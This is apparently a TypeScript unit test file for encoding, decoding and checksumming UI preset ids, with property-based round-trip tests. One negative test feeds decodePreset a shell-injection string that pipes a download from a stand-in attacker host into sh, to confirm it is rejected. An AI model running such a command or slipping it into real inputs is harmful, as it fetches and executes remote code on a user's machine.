import fc from "fast-check";

import { checksum, decodePreset, encodePreset, presetBlocks, presetChoices, presetItems, presetTheme, type Block, type Preset } from "@/content/preset";

const keys = <K extends keyof typeof presetChoices>(k: K) => Object.keys(presetChoices[k]) as Preset[K][];
const preset = fc.record({
  framework: fc.constantFrom(...keys("framework")),
  theme: fc.constantFrom(...keys("theme")),
  radius: fc.constantFrom(...keys("radius")),
  motion: fc.constantFrom(...keys("motion")),
  level: fc.constantFrom(...keys("level")),
  blocks: fc.subarray(Object.keys(presetBlocks) as Block[]),
});

describe("Create presets", () => {
  it("round-trip every combination, and every theme passes the validator (property)", () => {
    fc.assert(
      fc.property(preset, (p) => {
        const id = encodePreset(p);
        expect(id).toMatch(/^[nv][db][sml][cso][123]-[0-9a-f]{2}-[0-9a-f]{8}$/);
        expect(decodePreset(id)).toEqual({ ok: true, preset: p });
        expect(() => presetTheme(p)).not.toThrow();
      }),
    );
  });

  it("refuse an edited, mistyped or unknown id", () => {
    const id = encodePreset({ framework: "n", theme: "b", radius: "m", motion: "s", level: "3", blocks: ["agent-console"] });
    expect(decodePreset(id.replace("3-", "1-"))).toMatchObject({ ok: false, error: expect.stringMatching(/checksum does not match/) });
    expect(decodePreset("nbms9-01-00000000")).toMatchObject({ ok: false });
    expect(decodePreset("$(curl evil.example | sh)")).toMatchObject({ ok: false, error: expect.stringMatching(/not a preset id/) });
    const code = "nbms3-ff";
    expect(decodePreset(`${code}-${checksum(code)}`)).toMatchObject({ ok: false, error: "unknown block" });
  });

  it("install the level's items and the blocks' items, and keep the default theme when nothing changes", () => {
    expect(presetItems({ framework: "n", theme: "d", radius: "m", motion: "s", level: "3", blocks: ["charts", "approval-inbox"] })).toEqual([
      "use-idle-timeout", "approval-card", "area-chart", "bar-chart", "line-chart", "pie-chart", "radial-chart", "approval-inbox",
    ]);
    expect(presetTheme({ framework: "n", theme: "d", radius: "m", motion: "s", level: "1", blocks: [] })).toBeNull();
    expect(presetTheme({ framework: "v", theme: "b", radius: "l", motion: "o", level: "1", blocks: [] })).toMatchObject({ motion: 0, radius: { md: 18 }, colors: { light: { primary: "#1a2740" } } });
  });
});
